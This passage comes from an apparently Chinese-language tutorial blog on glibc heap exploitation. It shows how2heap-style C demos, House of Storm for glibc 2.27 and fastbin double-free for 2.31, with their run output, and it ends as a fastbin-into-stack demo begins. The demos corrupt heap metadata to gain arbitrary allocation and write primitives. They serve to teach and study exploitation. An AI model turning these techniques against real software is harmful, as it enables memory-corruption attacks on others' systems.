class="params">()</span>{</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// clearenv();</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the AMOUNT to shift over for size and the offset on the largebin.</span></span><br><span class="line"><span class="comment">// Needs to be a valid minimum sized chunk in order to work.</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_shift_amount</span><span class="params">(<span class="type">char</span>* pointer)</span>{</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> shift_amount = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> ptr = (<span class="type">long</span> <span class="type">long</span>)pointer;	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(ptr &gt; <span class="number">0x20</span>){</span><br><span class="line">		ptr = ptr &gt;&gt; <span class="number">8</span>; </span><br><span class="line">		shift_amount += <span class="number">1</span>; </span><br><span class="line">	}	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> shift_amount - <span class="number">1</span>; <span class="comment">// Want amount PRIOR to this being zeroed out</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line"></span><br><span class="line">	init();</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *unsorted_bin, *large_bin, *fake_chunk, *ptr;</span><br><span class="line">	<span class="type">int</span>* tcaches[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"House of Storm"</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"======================================"</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Preparing chunks for the exploit"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Put one chunk into unsorted bin and the other into the large bin"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"The unsorted bin chunk MUST be larger than the large bin chunk."</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Putting a chunk into the unsorted bin and another</span></span><br><span class="line"><span class="comment">	into the large bin.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span> ( <span class="number">0x4e8</span> );  <span class="comment">// size 0x4f0 </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// prevent merging </span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> ); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Find the proper chunk size to allocate."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Must be exactly the size of the written chunk from above."</span>);</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Find the proper size to allocate</span></span><br><span class="line"><span class="comment">	We are using the first 'X' bytes of the heap to act </span></span><br><span class="line"><span class="comment">	as the 'size' of a chunk. Then, we need to allocate a </span></span><br><span class="line"><span class="comment">	chunk exactly this size for the attack to work. </span></span><br><span class="line"><span class="comment">	So, in order to do this, we have to take the higher</span></span><br><span class="line"><span class="comment">	bits of the heap address and allocate a chunk of this</span></span><br><span class="line"><span class="comment">	size, which comes from the upper bytes of the heap address.</span></span><br><span class="line"><span class="comment">	<span class="doctag">NOTE:</span> </span></span><br><span class="line"><span class="comment">	- This does have a 1/2 chance of failing on the 4th bit. If the 4th bit </span></span><br><span class="line"><span class="comment">	of this value is set, then the size comparison will fail everytime.</span></span><br><span class="line"><span class="comment">	- There is ANOTHER 1/4 chance of this failing (for the demo). Either</span></span><br><span class="line"><span class="comment">	  the mmap bit needs to be set or the non-main arena cannot be set.</span></span><br><span class="line"><span class="comment">	- Without these calculations, this COULD be brute forced with relative</span></span><br><span class="line"><span class="comment">	  overwrites in a leakless fashion.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> shift_amount = get_shift_amount(unsorted_bin);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Shift Amount: %d\n"</span>, shift_amount); </span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> alloc_size = ((<span class="type">size_t</span>)unsorted_bin) &gt;&gt; (<span class="number">8</span> * shift_amount);</span><br><span class="line">	<span class="keyword">if</span>(alloc_size &lt; <span class="number">0x10</span>){</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Chunk Size: 0x%lx\n"</span>, alloc_size);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Chunk size is too small"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	}</span><br><span class="line">	alloc_size = (alloc_size &amp; <span class="number">0xFFFFFFFFE</span>) - <span class="number">0x10</span>; <span class="comment">// Remove the size bits</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"In this case, the chunk size is 0x%lx\n"</span>, alloc_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Checks to see if the program will crash or not</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The fourth bit of the size and the 'non-main arena' chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. </span></span><br><span class="line"><span class="comment">	Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438</span></span><br><span class="line"><span class="comment">	validates to see if ONE of the following cases is true: </span></span><br><span class="line"><span class="comment">	- av == arena_for_chunk (mem2chunk (mem))</span></span><br><span class="line"><span class="comment">	- chunk is mmaped</span></span><br><span class="line"><span class="comment">	If the 'non-main arena' bit is set on the chunk, then the </span></span><br><span class="line"><span class="comment">	first case will fail. </span></span><br><span class="line"><span class="comment">	If the mmap bit is set, then this will pass. </span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	So, either the arenas need to match up (our fake chunk is in the </span></span><br><span class="line"><span class="comment">	.bss section for this demo. So, clearly, this will not happen) OR</span></span><br><span class="line"><span class="comment">	the mmap bit must be set.</span></span><br><span class="line"><span class="comment">	The logic below validates that the fourth bit of the size</span></span><br><span class="line"><span class="comment">	is NOT set and that either the mmap bit is set or the non-main </span></span><br><span class="line"><span class="comment">	arena bit is NOT set. If this is the case, the exploit should work.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">        <span class="keyword">if</span>((alloc_size &amp; <span class="number">0x8</span>) != <span class="number">0</span> || (((alloc_size &amp; <span class="number">0x4</span>) == <span class="number">0x4</span>) &amp;&amp; ((alloc_size &amp; <span class="number">0x2</span>) != <span class="number">0x2</span>))){</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Allocation size has bit 4 of the size set or "</span>);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"mmap and non-main arena bit check will fail"</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Please try again! :)"</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Exiting..."</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the chunk would go into the TCache, we need to fill up</span></span><br><span class="line">	<span class="comment">// the TCache in order to prevent TCache stashing from happening.</span></span><br><span class="line">	<span class="keyword">if</span>(alloc_size &lt; <span class="number">0x410</span>){</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)"</span>);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Done to prevent usage of TCache stashing"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Fill up the TCache for the proper size</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++){</span><br><span class="line">			tcaches[i] = <span class="built_in">malloc</span>(alloc_size);</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++){</span><br><span class="line">			<span class="built_in">free</span>(tcaches[i]);</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span>{</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Not filling up the TCache"</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	large_bin  =  <span class="built_in">malloc</span> ( <span class="number">0x4d8</span> );  <span class="comment">// size 0x4e0 </span></span><br><span class="line">	<span class="comment">// prevent merging </span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIFO </span></span><br><span class="line">	<span class="built_in">free</span> ( large_bin );  <span class="comment">// put small chunks first </span></span><br><span class="line">	<span class="built_in">free</span> ( unsorted_bin );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Put the 'large bin' chunk into the large bin</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x4e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, there is a single chunk in the </span></span><br><span class="line"><span class="comment">	large bin and a single chunk in the unsorted bin. </span></span><br><span class="line"><span class="comment">	It should be noted that the unsorted bin chunk </span></span><br><span class="line"><span class="comment">	should be LARGER in size than the large bin chunk</span></span><br><span class="line"><span class="comment">	but should still be within the same bin.</span></span><br><span class="line"><span class="comment">	In this setup, the large_bin has a chunk</span></span><br><span class="line"><span class="comment">	of size 0x4e0 and the unsorted bin </span></span><br><span class="line"><span class="comment">	has a chunk of size 0x4f0. This technique relies on</span></span><br><span class="line"><span class="comment">	the unsorted bin chunk being added to the same bin</span></span><br><span class="line"><span class="comment">	but a larger chunk size. So, careful heap feng shui </span></span><br><span class="line"><span class="comment">	must be done.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The address that we want to write to!</span></span><br><span class="line">	fake_chunk = target - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.\n This is our target location to get from the allocator"</span>); </span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The address of our fake chunk is set to the unsorted bin </span></span><br><span class="line"><span class="comment">	chunks 'bk' pointer. </span></span><br><span class="line"><span class="comment">	This launches the 'unsorted_bin' attack but it is NOT the</span></span><br><span class="line"><span class="comment">	main purpose of us doing this.</span></span><br><span class="line"><span class="comment">	After launching the 'unsorted_bin attack' the 'victim' pointer</span></span><br><span class="line"><span class="comment">	will be set to THIS address. Our goal is to find a way to get</span></span><br><span class="line"><span class="comment">	this address from the allocator.</span></span><br><span class="line"><span class="comment">	Vulnerability!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Only needs to be a valid address. </span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;fd</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"of your fake chunk."</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Misalign the location in order to use the primitive as a SIZE value."</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"The 'offset' changes depending on if the binary is PIE (5) or not PIE (2)."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Vulnerability #2!"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at."</span>);</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	This can be seen as a WRITE-WHERE primitive in the large bin.</span></span><br><span class="line"><span class="comment">	However, we are going to write a 'size' for our fake chunk using this. </span></span><br><span class="line"><span class="comment">	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579</span></span><br><span class="line"><span class="comment">	to an address for our fake size. The write above (bk_nextsize) is</span></span><br><span class="line"><span class="comment">	controlled via the pointer we are going to overwrite below. The</span></span><br><span class="line"><span class="comment">	value that gets written is a heap address; the unsorted bin </span></span><br><span class="line"><span class="comment">	chunk address above. </span></span><br><span class="line"><span class="comment">	The 'key' to this is the offset. First, we subtract 0x18 because</span></span><br><span class="line"><span class="comment">	this is the offset to writting to fd_nextsize in the code shown </span></span><br><span class="line"><span class="comment">	above. Secondly, notice the -2 below. We are going</span></span><br><span class="line"><span class="comment">	to write a 'heap address' at a mis-aligned location and</span></span><br><span class="line"><span class="comment">	use THIS as the size. For instance, if the heap address is 0x123456</span></span><br><span class="line"><span class="comment">	and the pointer is set to 0x60006. This will write the following way:</span></span><br><span class="line"><span class="comment">	- 0x60006: 0x56</span></span><br><span class="line"><span class="comment">	- 0x60007: 0x34</span></span><br><span class="line"><span class="comment">	- 0x60008: 0x12</span></span><br><span class="line"><span class="comment">	Now, our 'fake size' is at 0x60008 and is a valid size for the </span></span><br><span class="line"><span class="comment">	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk</span></span><br><span class="line"><span class="comment">	from the allocator. </span></span><br><span class="line"><span class="comment">	Second vulnerability!!!</span></span><br><span class="line"><span class="comment">	// The shift amount is used in order to calculate the proper offset</span></span><br><span class="line"><span class="comment">	to write the chunk size at, depending on the size of the pointer.</span></span><br><span class="line"><span class="comment">	This depends on the size of the pointer. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, we've corrupted everything in just the right </span></span><br><span class="line"><span class="comment">	way so this should work. </span></span><br><span class="line"><span class="comment">	The purpose of the attack is to have a corrupted 'bk' pointer</span></span><br><span class="line"><span class="comment">	point to ANYWHERE we want and still get the memory back. We do</span></span><br><span class="line"><span class="comment">	this by using the large bin code to write a size to the 'bk' </span></span><br><span class="line"><span class="comment">	location.</span></span><br><span class="line"><span class="comment">	This call to calloc, will return a pointer</span></span><br><span class="line"><span class="comment">	to the fake chunk that we created above. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Make allocation of the size that the value will be written for."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Once the allocation happens, the madness begins"</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Once in the unsorted bin, the 'large bin' chunk will be used in orer to "</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"write a fake 'size' value to the location of our target."</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"After this, the target will have a valid size."</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid"</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"size and remove it from the bin."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"With this, we have pulled out an arbitrary chunk!"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"String before: %s\n"</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"String pointer: %p\n"</span>, target);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Make a call to 'calloc' instead of 'malloc' in order to "</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"not use the TCache on the allocation. Had to fill TCache"</span>);	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"because stashing would prevent the exploit from working"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Arena_for_chunk macro may cause this to crash as well</span></span><br><span class="line">	<span class="comment">// https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438</span></span><br><span class="line">	ptr = <span class="built_in">calloc</span>(alloc_size, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">strncpy</span>(ptr, <span class="string">"\x41\x42\x43\x44\x45\x46\x47"</span>, <span class="number">0x58</span> - <span class="number">1</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"String after %s\n"</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk ptr: %p\n"</span>, ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>house of strom则是在large bin attack的基础上借用unsorted bin来达到任意地址分配，首先malloc一个0x4e8，检查该chunk的地址最高非0位的值x，首先判断x是否小于0x10，x小于0x10不行，然后判断x的最低4位，3必须是0，2为1时1不能为0。总体的和2.23的一样，这里不再多说了包括largebin的应用上面都说了比较详细了。</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">House of Storm</span><br><span class="line">======================================</span><br><span class="line">Preparing chunks <span class="keyword">for</span> the exploit</span><br><span class="line">Put one chunk into unsorted bin and the other into the large bin</span><br><span class="line">The unsorted bin chunk MUST be larger than the large bin chunk.</span><br><span class="line">Find the proper chunk size to allocate.</span><br><span class="line">Must be exactly the size of the written chunk from above.</span><br><span class="line">Shift Amount: <span class="number">2</span></span><br><span class="line">In this <span class="keyword">case</span>, the chunk size is <span class="number">0x30</span></span><br><span class="line">Fill TCache of the allocation size amount <span class="keyword">if</span> the size of the target chunk is a TCache size chunk (<span class="number">0x20</span><span class="number">-0x410</span>)</span><br><span class="line">Done to prevent usage of TCache stashing</span><br><span class="line">Vulnerability! Overwrite unsorted bins <span class="string">'bk'</span> pointer with our target location.</span><br><span class="line"> This is our target location to get from the allocator</span><br><span class="line">Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location</span><br><span class="line">of your fake chunk.</span><br><span class="line">Misalign the location in order to use the primitive as a SIZE value.</span><br><span class="line">The <span class="string">'offset'</span> changes depending on <span class="keyword">if</span> the binary is PIE (<span class="number">5</span>) or not PIE (<span class="number">2</span>).</span><br><span class="line">Vulnerability #<span class="number">2</span>!</span><br><span class="line">Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.</span><br><span class="line">Make allocation of the size that the value will be written <span class="keyword">for</span>.</span><br><span class="line">Once the allocation happens, the madness begins</span><br><span class="line">Once in the unsorted bin, the <span class="string">'large bin'</span> chunk will be used in orer to </span><br><span class="line">write a fake <span class="string">'size'</span> value to the location of our target.</span><br><span class="line">After this, the target will have a valid size.</span><br><span class="line">Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid</span><br><span class="line">size and remove it from the bin.</span><br><span class="line">With this, we have pulled out an arbitrary chunk!</span><br><span class="line">String before: </span><br><span class="line">String pointer: <span class="number">0x404100</span></span><br><span class="line">Make a call to <span class="string">'calloc'</span> instead of <span class="string">'malloc'</span> in order to </span><br><span class="line">not use the TCache on the allocation. Had to fill TCache</span><br><span class="line">because stashing would prevent the exploit from working</span><br><span class="line">String after ABCDEFG</span><br><span class="line">Fake chunk ptr: <span class="number">0x404100</span></span><br></pre></td></tr></tbody></table></figure>

<h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><h3 id="fastbin-dup（double-free"><a href="#fastbin-dup（double-free" class="headerlink" title="fastbin_dup（double free)"></a>fastbin_dup（double free)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fill up tcache first.\n"</span>);</span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) {</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st calloc(1, 8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd calloc(1, 8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd calloc(1, 8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st calloc(1, 8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd calloc(1, 8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd calloc(1, 8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>和2.27一样的不多说了</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple <span class="type">double</span>-<span class="built_in">free</span> attack with fastbins.</span><br><span class="line">Fill up tcache first.</span><br><span class="line">Allocating <span class="number">3</span> buffers.</span><br><span class="line"><span class="number">1</span>st <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>, <span class="number">8</span>)</span>: 0x55555555b3a0</span><br><span class="line">2nd <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>, <span class="number">8</span>)</span>: 0x55555555b3c0</span><br><span class="line">3rd <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>, <span class="number">8</span>)</span>: 0x55555555b3e0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we <span class="built_in">free</span> 0x55555555b3a0 again, things will crash because 0x55555555b3a0 is at the top of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">So, instead, we'll <span class="built_in">free</span> 0x55555555b3c0.</span><br><span class="line">Now, we can <span class="built_in">free</span> 0x55555555b3a0 again, since it's not the head of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">Now the <span class="built_in">free</span> <span class="built_in">list</span> has [ 0x55555555b3a0, 0x55555555b3c0, 0x55555555b3a0 ]. If we <span class="built_in">malloc</span> 3 times, we'll get 0x55555555b3a0 twice!</span><br><span class="line">1st <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>, <span class="number">8</span>)</span>: 0x55555555b3a0</span><br><span class="line">2nd <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>, <span class="number">8</span>)</span>: 0x55555555b3c0</span><br><span class="line">3rd <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>, <span class="number">8</span>)</span>: 0x55555555b3a0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="fastbin-dup-into-stack-分配到栈上-1"><a href="#fastbin-dup-into-stack-分配到栈上-1" class="headerlink" title="fastbin_dup_into_stack(分配到栈上)"></a>fastbin_dup_into_stack(分配到栈上)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 